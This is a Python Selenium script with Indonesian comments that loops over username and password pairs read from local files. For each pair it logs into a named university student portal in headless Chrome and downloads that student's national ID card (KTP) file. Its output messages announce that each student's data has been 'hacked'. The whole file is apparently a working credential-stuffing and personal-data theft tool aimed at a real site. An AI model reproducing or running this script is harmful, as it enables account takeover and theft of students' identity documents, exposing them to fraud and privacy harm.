from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import os
import time
import requests
from urllib.parse import urlparse

# Fungsi untuk membuat folder baru jika belum ada
def create_folder_if_not_exists(folder_name):
    if not os.path.exists(folder_name):
        os.makedirs(folder_name)

# Fungsi untuk mengunduh file KTP
def download_ktp(username, password):
    # Set Chrome options untuk mode headless
    chrome_options = Options()
    chrome_options.add_argument("--headless")

    # Mengatur driver untuk browser Chrome dalam mode headless
    driver = webdriver.Chrome(options=chrome_options)

    # Membuka situs web
    driver.get("https://studentsite.uniku.ac.id/")

    # Menunggu hingga formulir login muncul
    time.sleep(2)
    username_field = driver.execute_script("return document.querySelector('#txtUser')")
    password_field = driver.execute_script("return document.querySelector('#txtPass')")
    login_button = driver.execute_script("return document.querySelector('#btnLogin')")

    # Mengisi formulir login
    driver.execute_script("arguments[0].value = arguments[1];", username_field, username)
    driver.execute_script("arguments[0].value = arguments[1];", password_field, password)
    login_button.click()

    # Menunggu halaman memuat
    time.sleep(2)

    # Klik pada menu yang berisi data KTP
    menu_ktp = driver.execute_script("return document.querySelector('#sidebar1_mnuLeft_I0i1_T')")
    menu_ktp.click()

    # Menunggu halaman memuat
    time.sleep(2)

    # Klik untuk mendownload data KTP 
    download_link = driver.execute_script("return document.querySelector('#lbl_ktp > a')")

    # Mendapatkan URL unduhan
    download_url = download_link.get_attribute("href")

    # Menutup browser
    driver.quit()

    # Mendownload file dengan requests
    response = requests.get(download_url)

    # Memeriksa apakah unduhan berhasil
    if response.status_code == 200:
        # Mendapatkan nama file dari URL
        parsed_url = urlparse(download_url)
        filename = os.path.basename(parsed_url.path)

        # Menyimpan file yang diunduh ke folder hasil dengan nama yang sama
        output_folder = "data/hasil"
        create_folder_if_not_exists(output_folder)
        with open(os.path.join(output_folder, filename), 'wb') as file:
            file.write(response.content)
        print(f"Data KTP untuk mahasiswa '{username}' telah di RETAS !.")
    else:
        print(f"Gagal mengunduh file untuk pengguna '{username}'.")

# Membaca pengguna dari file user.txt
with open("user.txt", 'r') as user_file:
    usernames = user_file.read().splitlines()

# Membaca kata sandi dari file pass.txt
with open("pass.txt", 'r') as pass_file:
    passwords = pass_file.read().splitlines()

# Melakukan iterasi berulang melalui setiap kombinasi pengguna dan kata sandi
for username, password in zip(usernames, passwords):
    download_ktp(username, password)

# Cek apakah semua pengguna telah diunduh
if len(usernames) == len(passwords):
    print("Semua data KTP Mahasiswa telah di RETAS !.")
